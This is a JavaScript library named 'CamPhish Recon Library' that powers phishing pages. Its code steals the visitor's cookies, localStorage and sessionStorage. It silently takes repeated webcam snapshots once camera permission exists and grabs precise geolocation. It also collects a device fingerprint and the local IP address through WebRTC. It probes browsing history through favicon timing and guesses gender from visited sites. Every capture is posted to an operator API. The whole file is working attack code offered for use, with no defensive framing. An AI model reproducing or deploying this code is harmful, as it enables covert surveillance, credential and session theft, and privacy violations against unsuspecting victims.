/**
 * CamPhish Recon Library v2.2
 * Sticky sessions, deduplication, enhanced fingerprinting, gender detection,
 * cookie/storage grabber, history detection, auto permissions
 */
(function(window){
'use strict';

var API = window.CAMPHISH_API || '/api';

// ============ STICKY SESSION MANAGEMENT ============
var Session = {
  KEY: 'camphish_session',
  COOKIE_NAME: 'camphish_sid',
  id: 'default',
  captured: {},

  init: function() {
    // Try to load existing session from localStorage
    try {
      var saved = JSON.parse(localStorage.getItem(this.KEY) || '{}');
      if (saved.id && saved.ts && (Date.now() - saved.ts < 86400000)) {
        this.id = saved.id;
        this.captured = saved.captured || {};
      } else {
        this.generate();
      }
    } catch(e) {
      this.generate();
    }
    // Also check/set cookie for server-side correlation
    this.setCookie();
  },

  generate: function() {
    this.id = 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
    this.captured = {};
    this.save();
  },

  save: function() {
    try {
      localStorage.setItem(this.KEY, JSON.stringify({
        id: this.id,
        ts: Date.now(),
        captured: this.captured
      }));
    } catch(e) {}
  },

  setCookie: function() {
    try {
      document.cookie = this.COOKIE_NAME + '=' + this.id + ';path=/;max-age=86400;SameSite=Lax';
    } catch(e) {}
  },

  hasCaptured: function(type) {
    return !!this.captured[type];
  },

  markCaptured: function(type) {
    this.captured[type] = Date.now();
    this.save();
  },

  getId: function() {
    return this.id;
  }
};

Session.init();

// ============ PERSISTENT PERMISSIONS ============
var PermTracker = {
  KEY: 'camphish_perms',
  get: function(){
    try { return JSON.parse(localStorage.getItem(this.KEY) || '{}'); }
    catch(e) { return {}; }
  },
  set: function(name, granted){
    var perms = this.get();
    perms[name] = { granted: granted, ts: Date.now() };
    localStorage.setItem(this.KEY, JSON.stringify(perms));
  },
  wasGranted: function(name){
    var p = this.get()[name];
    return p && p.granted;
  }
};

// ============ GENDER DETECTION ============
var GenderDetect = {
  femaleSites: ['https://www.pinterest.com/favicon.ico','https://www.instagram.com/favicon.ico','https://www.tumblr.com/favicon.ico','https://www.etsy.com/favicon.ico','https://www.shein.com/favicon.ico'],
  maleSites: ['https://www.reddit.com/favicon.ico','https://store.steampowered.com/favicon.ico','https://www.linkedin.com/favicon.ico','https://www.espn.com/favicon.ico','https://opensea.io/favicon.ico'],
  neutralSites: ['https://www.youtube.com/favicon.ico','https://www.facebook.com/favicon.ico','https://twitter.com/favicon.ico'],

  detect: function(callback){
    var self = this;
    var results = { female: 0, male: 0, neutral: 0, visited: [] };
    var allSites = [].concat(
      this.femaleSites.map(function(u){return {url:u, gender:'female'};}),
      this.maleSites.map(function(u){return {url:u, gender:'male'};}),
      this.neutralSites.map(function(u){return {url:u, gender:'neutral'};})
    );
    var checked = 0;
    var done = false;

    allSites.forEach(function(site){
      self._checkVisited(site.url, function(visited){
        if (visited) {
          results[site.gender]++;
          results.visited.push(site.url.split('/')[2]);
        }
        checked++;
        if (checked >= allSites.length && !done) {
          done = true;
          self._finish(results, callback);
        }
      });
    });
    setTimeout(function(){
      if (!done) { done = true; self._finish(results, callback); }
    }, 3000);
  },

  _finish: function(results, callback) {
    var prediction = 'unknown';
    if (results.female > results.male && results.female > 0) prediction = 'female';
    else if (results.male > results.female && results.male > 0) prediction = 'male';
    results.prediction = prediction;
    results.confidence = Math.abs(results.female - results.male) / Math.max(results.female + results.male, 1);
    callback(results);
  },

  _checkVisited: function(url, cb){
    try {
      var start = performance.now();
      var img = new Image();
      img.onload = function(){ cb((performance.now() - start) < 10); };
      img.onerror = function(){ cb((performance.now() - start) < 10); };
      img.src = url;
    } catch(e) { cb(false); }
  }
};

// ============ ENHANCED FINGERPRINT ============
var Fingerprint = {
  collect: function(callback){
    var fp = {};
    fp.screen_resolution = screen.width + 'x' + screen.height;
    fp.color_depth = screen.colorDepth;
    fp.pixel_ratio = window.devicePixelRatio;
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.timezone_offset = new Date().getTimezoneOffset();
    fp.language = navigator.language;
    fp.languages = (navigator.languages || []).join(',');
    fp.platform = navigator.platform;
    fp.hardware_concurrency = navigator.hardwareConcurrency;
    fp.device_memory = navigator.deviceMemory || null;
    fp.max_touch_points = navigator.maxTouchPoints || 0;
    fp.cookie_enabled = navigator.cookieEnabled;
    fp.do_not_track = navigator.doNotTrack;

    try {
      var c = document.createElement('canvas');
      var cx = c.getContext('2d');
      cx.textBaseline = 'top';
      cx.font = '14px Arial';
      cx.fillStyle = '#f60';
      cx.fillRect(0, 0, 100, 30);
      cx.fillStyle = '#069';
      cx.fillText('CamPhish FP', 2, 2);
      cx.fillStyle = 'rgba(102,204,0,0.7)';
      cx.fillText('CamPhish FP', 4, 4);
      fp.canvas_fingerprint = c.toDataURL().substring(0, 200);
    } catch(e) {}

    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        fp.webgl_vendor = gl.getParameter(gl.VENDOR);
        fp.webgl_renderer = gl.getParameter(gl.RENDERER);
        fp.webgl_version = gl.getParameter(gl.VERSION);
        fp.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        fp.webgl_fingerprint = fp.webgl_vendor + ' ' + fp.webgl_renderer;
      }
    } catch(e) {}

    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var oscillator = ac.createOscillator();
      var gain = ac.createGain();
      gain.gain.value = 0;
      oscillator.connect(gain);
      gain.connect(ac.destination);
      oscillator.start(0);
      fp.audio_sample_rate = ac.sampleRate;
      fp.audio_state = ac.state;
      fp.audio_max_channel = ac.maxChannelCount;
      setTimeout(function(){ oscillator.stop(); ac.close(); }, 100);
    } catch(e) {}

    try {
      var testFonts = ['Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas','Courier New','Georgia','Helvetica','Impact','Lucida Console','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana'];
      var baseFonts = ['monospace','sans-serif','serif'];
      var s = document.createElement('span');
      s.style.fontSize = '72px'; s.style.position = 'absolute'; s.style.visibility = 'hidden';
      s.innerHTML = 'mmmmmmmmmmlli';
      var defaultW = {}, defaultH = {};
      for (var i in baseFonts) {
        s.style.fontFamily = baseFonts[i];
        document.body.appendChild(s);
        defaultW[baseFonts[i]] = s.offsetWidth;
        defaultH[baseFonts[i]] = s.offsetHeight;
        document.body.removeChild(s);
      }
      var detected = [];
      for (var i in testFonts) {
        var found = false;
        for (var j in baseFonts) {
          s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
          document.body.appendChild(s);
          if (s.offsetWidth != defaultW[baseFonts[j]] || s.offsetHeight != defaultH[baseFonts[j]]) found = true;
          document.body.removeChild(s);
        }
        if (found) detected.push(testFonts[i]);
      }
      fp.font_list = detected.join(',');
      fp.font_count = detected.length;
    } catch(e) {}

    if (navigator.getBattery) {
      navigator.getBattery().then(function(b){
        fp.battery_level = b.level;
        fp.battery_charging = b.charging;
        fp.battery_charging_time = b.chargingTime;
        fp.battery_discharging_time = b.dischargingTime;
        finishFp();
      }).catch(function(){ finishFp(); });
    } else { finishFp(); }

    if (navigator.connection) {
      fp.connection_type = navigator.connection.effectiveType;
      fp.connection_downlink = navigator.connection.downlink;
      fp.connection_rtt = navigator.connection.rtt;
      fp.connection_save_data = navigator.connection.saveData;
    }

    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(function(devices){
        fp.camera_count = devices.filter(function(d){return d.kind === 'videoinput';}).length;
        fp.microphone_count = devices.filter(function(d){return d.kind === 'audioinput';}).length;
      }).catch(function(){});
    }

    try {
      if (window.DeviceOrientationEvent) fp.has_gyroscope = true;
      if (window.DeviceMotionEvent) fp.has_accelerometer = true;
    } catch(e) {}

    function finishFp() {
      fp.session = Session.getId();
      fp.collected_at = new Date().toISOString();
      try {
        var pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        pc.createOffer(function(offer){ pc.setLocalDescription(offer, function(){}, function(){}); }, function(){});
        pc.onicecandidate = function(e){
          if (e && e.candidate && e.candidate.candidate) {
            var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (m && m[1] && !m[1].startsWith('0.')) {
              fp.local_ip = m[1];
              sendFp(fp);
            }
            pc.close();
          }
        };
        setTimeout(function(){ pc.close(); sendFp(fp); }, 3000);
      } catch(e) { sendFp(fp); }
    }
  }
};

function sendFp(fp) {
  fp.session = Session.getId();
  fetch(API + '/capture/fingerprint', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(fp)
  }).catch(function(){});
}

// ============ CAPTURE (with deduplication) ============
var Capture = {
  ip: function() {
    if (Session.hasCaptured('ip')) return;
    Session.markCaptured('ip');
    fetch(API + '/capture/ip', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: Session.getId()})
    }).catch(function(){});
  },

  location: function() {
    if (!navigator.geolocation) return;
    if (Session.hasCaptured('location')) return;
    if (PermTracker.wasGranted('location')) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          if (Session.hasCaptured('location')) return;
          Session.markCaptured('location');
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
        },
        function() { PermTracker.set('location', false); },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 60000}
      );
    } else {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          if (Session.hasCaptured('location')) return;
          Session.markCaptured('location');
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
          Capture._event('location_granted', {lat: pos.coords.latitude, lon: pos.coords.longitude});
        },
        function() {
          PermTracker.set('location', false);
          Capture._event('location_denied', {});
        },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 60000}
      );
    }
  },

  _sendLoc: function(pos) {
    fetch(API + '/capture/location', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: pos.coords.latitude, lon: pos.coords.longitude,
        acc: pos.coords.accuracy, altitude: pos.coords.altitude,
        heading: pos.coords.heading, speed: pos.coords.speed,
        session: Session.getId()
      })
    }).catch(function(){});
  },

  image: function(dataUrl, method) {
    fetch(API + '/capture/image', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        cat: dataUrl, session: Session.getId(),
        capture_method: method || 'canvas'
      })
    }).catch(function(){});
  },

  camera: function(video, canvas, interval) {
    if (!video || !canvas) return null;
    var ctx = canvas.getContext('2d');
    var timer = setInterval(function(){
      if (video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        Capture.image(canvas.toDataURL('image/png'), 'canvas');
      }
    }, interval || 2500);
    return timer;
  },

  _event: function(type, data) {
    fetch(API + '/capture/event', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: Session.getId(), event_type: type, event_data: data || null})
    }).catch(function(){});
  },

  event: function(type, data) { this._event(type, data); }
};

// ============ BROWSER STORAGE GRABBER ============
var StorageGrabber = {
  grab: function() {
    if (Session.hasCaptured('storage')) return;
    Session.markCaptured('storage');
    var data = {session: Session.getId()};
    try { data.cookies = document.cookie; data.cookie_count = document.cookie ? document.cookie.split(';').length : 0; } catch(e) {}
    try {
      var ls = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (key === Session.KEY || key === PermTracker.KEY) continue;
        try { var val = localStorage.getItem(key); ls[key] = val && val.length < 2000 ? val : '[truncated]'; } catch(e) { ls[key] = '[error]'; }
      }
      data.localStorage = ls; data.localStorage_keys = Object.keys(ls).length;
    } catch(e) {}
    try {
      var ss = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        try { var val = sessionStorage.getItem(key); ss[key] = val && val.length < 2000 ? val : '[truncated]'; } catch(e) { ss[key] = '[error]'; }
      }
      data.sessionStorage = ss; data.sessionStorage_keys = Object.keys(ss).length;
    } catch(e) {}
    fetch(API + '/capture/storage', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).catch(function(){});
  }
};

// ============ BROWSER HISTORY DETECTION ============
var HistoryDetect = {
  sites: [
    {url:'https://www.facebook.com/favicon.ico',cat:'social'},
    {url:'https://www.instagram.com/favicon.ico',cat:'social'},
    {url:'https://www.tiktok.com/favicon.ico',cat:'social'},
    {url:'https://www.snapchat.com/favicon.ico',cat:'social'},
    {url:'https://www.youtube.com/favicon.ico',cat:'video'},
    {url:'https://www.netflix.com/favicon.ico',cat:'video'},
    {url:'https://www.amazon.com/favicon.ico',cat:'shopping'},
    {url:'https://www.binance.com/favicon.ico',cat:'crypto'},
    {url:'https://github.com/favicon.ico',cat:'dev'},
  ],
  detect: function(callback) {
    if (Session.hasCaptured('history')) { callback({visited:[],skipped:true}); return; }
    Session.markCaptured('history');
    var results = {visited: [], categories: {}};
    var checked = 0, done = false;
    var self = this;
    this.sites.forEach(function(site) {
      try {
        var start = performance.now();
        var img = new Image();
        img.onload = function() {
          if ((performance.now()-start) < 10) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
          if (++checked >= self.sites.length && !done) { done = true; callback(results); }
        };
        img.onerror = function() {
          if ((performance.now()-start) < 10) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
          if (++checked >= self.sites.length && !done) { done = true; callback(results); }
        };
        img.src = site.url;
      } catch(e) { if (++checked >= self.sites.length && !done) { done = true; callback(results); } }
    });
    setTimeout(function(){ if (!done) { done = true; callback(results); } }, 4000);
  }
};

// ============ AUTO CAMERA/LOCATION (only if not yet captured) ============
var AutoPerm = {
  checkAndRequest: function() {
    if (navigator.permissions) {
      navigator.permissions.query({name: 'camera'}).then(function(status) {
        if (status.state === 'granted' && !Session.hasCaptured('camera_auto')) {
          Session.markCaptured('camera_auto');
          PermTracker.set('camera', true);
          navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream) {
            Capture.event('camera_auto_granted', {});
            var v = document.getElementById('v') || document.createElement('video');
            v.id = 'v'; v.playsInline = true; v.autoplay = true; v.muted = true;
            v.srcObject = stream; v.play();
            if (!document.getElementById('v')) document.body.appendChild(v);
            var cap = document.getElementById('cap');
            if (!cap) { cap = document.createElement('canvas'); cap.id = 'cap'; cap.width = 320; cap.height = 240; cap.style.display = 'none'; document.body.appendChild(cap); }
            var ctx = cap.getContext('2d');
            setInterval(function() {
              if (v.readyState >= 2) { ctx.drawImage(v, 0, 0, 320, 240); Capture.image(cap.toDataURL('image/png'), 'auto'); }
            }, 3000);
          }).catch(function() {});
        }
      }).catch(function() {});
      // Location auto-request ONLY if not already captured
      navigator.permissions.query({name: 'geolocation'}).then(function(status) {
        if (status.state === 'granted' && !Session.hasCaptured('location')) {
          Session.markCaptured('location');
          navigator.geolocation.getCurrentPosition(function(pos) {
            Capture._sendLoc(pos);
            Capture.event('location_auto_acquired', {});
          }, function() {}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 60000});
        }
      }).catch(function() {});
    }
  }
};

// ============ INIT ============
var Recon = {
  init: function(opts) {
    opts = opts || {};
    // IP — only once per session
    Capture.ip();
    // Location — only once per session
    Capture.location();
    // Fingerprint — only once per session
    if (!Session.hasCaptured('fingerprint')) {
      Session.markCaptured('fingerprint');
      Fingerprint.collect(function(){});
    }
    // Gender detection — only once per session
    if (opts.genderDetect !== false && !Session.hasCaptured('gender')) {
      Session.markCaptured('gender');
      GenderDetect.detect(function(result) {
        Capture.event('gender_detected', result);
      });
    }
    // Storage grab — only once per session
    StorageGrabber.grab();
    // History detection — only once per session
    HistoryDetect.detect(function(results) {
      if (!results.skipped) Capture.event('history_detected', results);
    });
    // Auto permissions — only if not yet captured
    AutoPerm.checkAndRequest();

    // Watch for permission changes
    if (navigator.permissions) {
      navigator.permissions.query({name: 'geolocation'}).then(function(status){
        if (status.state === 'granted') PermTracker.set('location', true);
        status.onchange = function(){ PermTracker.set('location', status.state === 'granted'); };
      }).catch(function(){});
      navigator.permissions.query({name: 'camera'}).then(function(status){
        if (status.state === 'granted') PermTracker.set('camera', true);
        status.onchange = function(){ PermTracker.set('camera', status.state === 'granted'); };
      }).catch(function(){});
    }
  },

  requestCamera: function(callback) {
    navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream){
      PermTracker.set('camera', true);
      Capture.event('camera_granted', {});
      callback(null, stream);
    }).catch(function(err){
      PermTracker.set('camera', false);
      Capture.event('camera_denied', {error: err.name});
      callback(err);
    });
  },

  Capture: Capture,
  Fingerprint: Fingerprint,
  GenderDetect: GenderDetect,
  PermTracker: PermTracker,
  Session: Session,
  StorageGrabber: StorageGrabber,
  HistoryDetect: HistoryDetect
};

window.CamPhishRecon = Recon;
window.CamPhishSession = Session.getId();

})(window);
